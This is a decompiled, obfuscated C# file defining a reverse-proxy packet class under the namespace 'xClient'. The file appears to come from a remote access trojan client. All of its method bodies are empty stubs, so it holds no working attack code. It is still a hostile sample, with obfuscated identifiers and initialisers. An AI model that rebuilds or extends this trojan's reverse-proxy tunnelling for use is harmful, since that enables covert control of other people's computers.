using System;
using System.Net;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;

namespace xClient.Core.ReverseProxy.Packets;

[Serializable]
public class ReverseProxyConnectResponse : GInterface4
{
	internal static ReverseProxyConnectResponse mtUPP849sJ8S5hKnDEP;

	public int ConnectionId
	{
		[CompilerGenerated]
		get
		{
			return 0;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public bool IsConnected
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	private IPAddress LocalAddress
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public int LocalPort
	{
		[CompilerGenerated]
		get
		{
			return 0;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public string HostName
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public ReverseProxyConnectResponse(int connectionId, bool isConnected, IPAddress localAddress, int localPort, string targetServer)
	{
	}

	public void Execute(GClass33 client)
	{
	}

	static ReverseProxyConnectResponse()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
	}

	internal static bool Ps41Yq4DODZRtiGNeGI()
	{
		return true;
	}

	internal static ReverseProxyConnectResponse r3431g4dUBRGhfQ7oMl()
	{
		return null;
	}

	internal static void DfI87q4zthSfp5AfJ8B()
	{
	}

	internal static bool YOBOHdnbqMPjNh5fOIE(object object_0)
	{
		return true;
	}

	internal static object WampGln4YhgvSrUUtit(object object_0)
	{
		return null;
	}
}
